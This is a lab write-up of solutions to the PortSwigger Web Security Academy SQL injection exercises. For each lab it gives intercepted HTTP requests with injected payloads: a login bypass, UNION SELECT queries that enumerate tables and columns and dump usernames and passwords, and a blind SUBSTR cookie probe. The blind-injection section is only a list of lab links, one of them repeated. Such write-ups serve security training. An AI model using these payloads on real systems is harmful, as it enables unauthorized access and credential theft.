
## Basics

### Retrieving hidden data

Fetch all the products including unreleased ones.

https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

#### Solution
1. Intercept the request with category filter applied.
2. Modify the category in the category filter GET request endpoint like below.
   
   ```
   GET /filter?category=Gifts'+OR+1=1-- HTTP/2
   ```

### Login bypass

Bypass login without valid password.

https://portswigger.net/web-security/sql-injection/lab-login-bypass

#### Solution
1. Navigate to login page by clicking on my account link.
2. Intercept the request for login after entering username as administrator and password as test.
3. Modify the username in login POST request payload like below.
   
   ```
   csrf=XhmdnmmWIGWqfJ9MERCaWrdWSYBCO18H&username=administrator'--&password=test
   ```

## Examining the database

### Querying oracle database

Print the version and type of oracle database.

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

#### Solution
1. Intercept the request with category filter applied.
2. Modify the category in category filter GET request endpoint like below.
   
   ```
   GET /filter?category=Gifts'+UNION+SELECT+banner,NULL+FROM+v$version-- HTTP/2
   ```

### Querying mysql database

Print the version and type of mysql database.

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

#### Solution
1. Intercept the request with category filter applied.
2. Modify the category in category filter GET request endpoint like below.
   
   ```
   GET /filter?category=Gifts'+UNION+SELECT+@@version,NULL# HTTP/2
   ```

### Listing contents non-oracle database

Login as administrator

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

#### Solution
1. Intercept the request with category filter applied.
2. Identify all the table names by modifying the category in category filter GET request endpoint like below.
   
   ```
   GET /filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables# HTTP/2
   ```
3. Using the table name for users which was identified in the previous step, find out the columns in the users table like below.

   ```
   GET /filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='USERS_LKLCZG'# HTTP/2
   ````
4. Fetch all the usernames and passwords using the query below.

   ```
   GET /filter?category=Gifts'+UNION+SELECT+USERNAME_HSGOKI,PASSWORD_KLQBNX+FROM+USERS_LKLCZG# HTTP/2
   ````

### Listing contents oracle database

Login as administrator

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle

#### Solution
1. Intercept the request with category filter applied.
2. Identify all the table names by modifying the category in category filter GET request endpoint like below.
   
   ```
   GET /filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables-- HTTP/2
   ```
3. Using the table name for users which was identified in the previous step, find out the columns in the users table like below.

   ```
   GET /filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_LKLCZG'-- HTTP/2
   ````
4. Fetch all the usernames and passwords using the query below.

   ```
   GET /filter?category=Gifts'+UNION+SELECT+USERNAME_HSGOKI,PASSWORD_KLQBNX+FROM+USERS_LKLCZG-- HTTP/2
   ````


## Union attacks

### Determine number of columns in a table

Find the number of columns in the table

https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

#### Solution
1. Intercept the request with category filter applied.
2. Identify all the table names by modifying the category in category filter GET request endpoint like below.
   
   ```
   GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL-- HTTP/2
   ```

### Find column containing text

Find the number of columns, their datatypes and return a specific text.

https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

#### Solution
1. Intercept the request with category filter applied.
2. Identify all the table names by modifying the category in category filter GET request endpoint like below.
   
   ```
   GET /filter?category=Gifts'+UNION+SELECT+NULL,'6gJ4dY',NULL-- HTTP/2
   ```

### Retrieve data from other tables

Login as administrator

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

#### Solution
1. Intercept the request with category filter applied.
2. Identify all the table names by modifying the category in category filter GET request endpoint like below.
   
   ```
   GET /filter?category=Gifts'+UNION+SELECT+username,password+from+users-- HTTP/2
   ```

### Retrieve multiple values in a single column

Login as administrator

https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

#### Solution
1. Intercept the request with category filter applied.
2. Identify all the table names by modifying the category in category filter GET request endpoint like below.
   
   ```
   GET /filter?category=Gifts'+UNION+SELECT+NULL,CONCAT(username,password)+FROM+users--  HTTP/2
   ```


## Blind SQL injection

### Blind SQL injection with conditional responses

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

#### Solution
1. Intercept the request with tracking id.
2. Append the tracking id cookie value with the following SQL query.
   
   ```
   Cookie: TrackingId=V1OUe47McOPDhNGq' AND SUBSTR((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a; session=fwR6Azt6fN3RB8quKUmE35SxqmvMmpvd
   ```
3. Fuzz the position of character and the character value (OWASP ZAP works better for bruteforcing.)

https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

